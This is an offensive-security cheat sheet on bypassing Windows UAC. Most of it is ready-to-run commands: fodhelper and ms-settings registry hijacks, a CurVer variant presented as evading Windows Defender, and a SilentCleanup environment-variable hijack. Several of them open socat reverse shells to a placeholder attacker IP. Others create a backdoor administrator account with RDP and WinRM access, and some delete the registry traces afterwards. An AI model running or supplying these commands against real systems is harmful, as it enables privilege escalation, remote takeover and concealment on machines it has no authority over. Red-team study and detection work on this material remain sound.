# UAC Bypass

## UAC / Integrity Level Bypass

From Windows Vista onward, processes run on four integrity levels:

<table data-full-width="true"><thead><tr><th width="287">Integrity Level</th><th>Use</th></tr></thead><tbody><tr><td>Low</td><td>Generally used for interaction with the Internet (i.e. Internet Explorer), sandboxed processes or for directories storing temporary data. Has very limited permissions.</td></tr><tr><td>Medium</td><td>Assigned to standard users and Administrators' filtered tokens.</td></tr><tr><td>High</td><td>Used by Administrators' elevated tokens if UAC is enabled. If UAC is disabled, all administrators will always use a high IL token.</td></tr><tr><td>System</td><td>Reserved for system use/rights (kernel, ...).</td></tr></tbody></table>

{% hint style="warning" %}
{% code overflow="wrap" %}
```
Only possible when the mandatory level is medium and when your account belongs to the local Administrators group. (If you're not an admin, UAC bypass won't help.)
```
{% endcode %}
{% endhint %}

<pre class="language-powershell" data-overflow="wrap" data-full-width="true"><code class="lang-powershell">https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works
https://github.com/hfiref0x/UACME
https://woshub.com/decoding-ad-useraccountcontrol-value/

https://devblogs.microsoft.com/oldnewthing/20160816-00/?p=94105
<strong>https://www.ired.team/offensive-security/persistence/t1122-com-hijacking
</strong>https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1
https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-FodHelperBypass.ps1
#UAC "Always Notify" Bypass W10
https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/
#UAC "Always Notify" Bypass W8.1
https://bugs.chromium.org/p/project-zero/issues/detail?id=156&#x26;can=1&#x26;q=uac
# EventViewer-UACBypass
https://github.com/CsEnox/EventViewer-UACBypass

https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper/
https://github.com/blue0x1/uac-bypass-oneliners


# ATTENTION, FOR THIS BYPASS TO WORK WE NEED TO EXECUTE IT ON A PS SHELL BUT NOT GUI (RDP)
whoami /groups
# If we see Medium Mandatory Level, we have medium integrity so we are limited even with admin rights. 
# To achieve High Integrity Level
powershell.exe Start-Process cmd.exe -Verb runAs
# fodhelper.exe UAC Bypass (using sigcheck.exe from SysInternal Suite)
sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe -accepteula
# If we see requireAdministrator and autoElevate = true, good to go (maybe it does not work if it is set to Always Notify)
# Now with Process Monitor we filter:
Process Name is fodhelper.exe
Operation contains Reg
Result is NAME NOT FOUND
Path contains HKCU
# If wee see errors there, check what is the interaction and how we can alter the Registry to execute our payload
# Add a key
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
# Specify value and type of a key
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
# This is a process we could use to discover more of this UAC bypasses
# To trigger the bypass
Start-Process "C:\Windows\System32\fodhelper.exe -WindowStyle Hidden"
# Some commands can be detected by AV so better to change Administrator password or add a new admin
FodhelperBypass -program "cmd.exe /c net user Administrator Password123!"
FodhelperBypass -program "cmd.exe /c net user newuser Password123! /add"
# Add three groups to log in via WinRM / RDP and be Administrator
FodhelperBypass -program "cmd.exe /c net localgroup Administrators newuser /add"
FodhelperBypass -program "cmd.exe /c net localgroup ""Remote Desktop Users"" newuser /add &#x26;&#x26; net localgroup ""Remote Management Users"" newuser /add"
FodhelperBypass -program "cmd.exe /c net localgroup ""Remote Desktop Users"" Administrator /add &#x26;&#x26; net localgroup ""Remote Management Users"" Administrator /add"
</code></pre>

## Filtered Token&#x20;

Differences between opening app normal way or Run as administrator. Normal way effectively denies any privileges related to being part of the Administrators group

```powershell
whoami /groups # you find Medium Integrity Level
```

## GUI bypasses

{% code overflow="wrap" fullWidth="true" %}
```powershell
# msconfig
Run msconfig
With Process Hacker, notice it runs with High Integrity w/o any prompt
msconfig > Tools tab > Command Prompt > launch cmd.exe, it will run with High Integrity

# azman.msc
Run > azman.msc
On the app > Help > Help Topics
On the help screen, we will right-click any part of the help article and select View Source
Notepad process > go to File->Open > Extension -> Select All Files > search for c:\windows\system32\cmd.exe > right-click on it > Open
```
{% endcode %}

## Auto-Elevating Processes

{% code overflow="wrap" fullWidth="true" %}
```powershell
# AutoElevate
https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck
For an application, some requirements need to be met to auto-elevate:
    The executable must be signed by the Windows Publisher
    The executable must be contained in a trusted directory, like %SystemRoot%/System32/ or %ProgramFiles%/
Depending on the type of application, additional requirements may apply:
    Executable files (.exe) must declare the autoElevate element inside their manifests -> check with sigcheck
    mmc.exe will auto elevate depending on the .msc snap-in that the user requests. Most of the .msc files included with Windows will auto elevate.
    Windows keeps an additional list of executables that auto elevate even when not requested in the manifest. This list includes pkgmgr.exe and spinstall.exe, for example.
    COM objects can also request auto-elevation by configuring some registry keys (https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker).

# Fodhelper (can be abused w/o GUI access) -> socat is just and example to get a revshell
https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
C:\> reg add %REG_KEY% /d %CMD% /f
C:\> fodhelper.exe
# Clearing our tracks
reg delete HKCU\Software\Classes\ms-settings\ /f
```
{% endcode %}

## Improving the Fodhelper Exploit to Bypass Windows Defender

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Run fodhelper.exe immediately -> unreliable, depending on your luck fodhelper might execute before the AV kicks in or not
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
C:\> reg add %REG_KEY% /d %CMD% /f & fodhelper.exe

# Improving the fodhelper exploit
https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
C:\> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
C:\> fodhelper.exe

# Clearing our tracks (from High Integrity shell) -> to avoid detection
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```
{% endcode %}

## Environment Variable Expansion - Bypassing Always Notify

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Windows Defender should be disabled or some difficulties might arise running the exploit
# Task Scheduler > DiskCleanup Scheduled Task -> it has to be executed by an Administrator to work (obviously) 
# checking the Actions tab on the scheduled task, we see a command which depends on environmental variables:
%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%

# We can override the %windir% variable through the registry by creating an entry in HKCU\Environment
C:\> reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f
# we concatenate "&REM " (ending with a blank space) to comment whatever is put after %windir% env. var. on "Actions" tab and ignore it
C:\> schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
# Result should be a shell with high IL

# Clearing our tracks 
reg delete "HKCU\Environment" /v "windir" /f
```
{% endcode %}

## Automated Exploitation

```powershell
https://github.com/hfiref0x/UACME
C:\tools>UACME-Akagi64.exe 33
# Some methods:
33 	fodhelper.exe
34 	DiskCleanup scheduled task
70 	fodhelper.exe using CurVer registry key
```

[https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/](https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/)

[https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies](https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies)

[https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html)
